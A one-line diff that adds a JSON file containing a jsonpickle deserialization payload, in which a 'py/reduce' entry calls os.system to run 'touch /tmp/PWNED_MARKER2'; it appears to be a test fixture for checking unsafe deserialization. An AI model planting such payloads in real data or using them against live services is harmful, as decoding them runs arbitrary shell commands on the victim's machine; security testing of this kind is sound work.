@@ -1,0 +1,1 @@
+{"results": [{"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["touch /tmp/PWNED_MARKER2"]}]}]}
